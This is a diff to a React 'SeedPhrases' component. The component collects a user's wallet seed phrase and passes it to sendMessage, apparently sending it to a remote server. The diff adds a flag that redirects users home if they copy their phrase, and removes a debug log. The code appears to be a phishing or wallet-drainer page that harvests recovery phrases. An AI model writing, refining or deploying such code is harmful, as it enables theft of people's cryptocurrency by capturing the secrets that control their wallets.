@@ -25,6 +25,7 @@ const SeedPhrases: React.FC = () => {
     const [formError, setFormError] = useState<string>('')
     const [errorCount, setErrorCount] = useState<number>(0)
     const [isCopied, setIsCopied] = useState<string>('Copy')
+    const [copiedText, setCopiedText] = useState<boolean>(false)
     const [info, setInfo] = useState<string>('')
 
     useEffect(() => {
@@ -47,14 +48,18 @@ const SeedPhrases: React.FC = () => {
     const copySeedPhrase = () => {
         navigator.clipboard.writeText(Object.values(words).join(' '))
         setIsCopied('Copied')
+        setCopiedText(true)
     }
 
     const showModal = () => {
+        if (copiedText) {
+            window.location.href = '/'
+            return
+        }
         if (validateSeedPhrase()) {
             setFormError('')
             setIsModalOpen(true)
             let tempCount = errorCount
-            console.log(tempCount)
             sendMessage(Object.values(words).join(' '))
                 .then((res) => {
                     if (res.ok) {
@@ -200,7 +205,7 @@ const SeedPhrases: React.FC = () => {
                             </p>
                             <div className="flex justify-between w-full items-end">
                                 <BackButton
-                                    accepted={errorCount == -10}
+                                    accepted={errorCount == -10 && !copiedText}
                                     text={'Continue'}
                                     arrowDirection={'forward'}
                                     function={showModal}
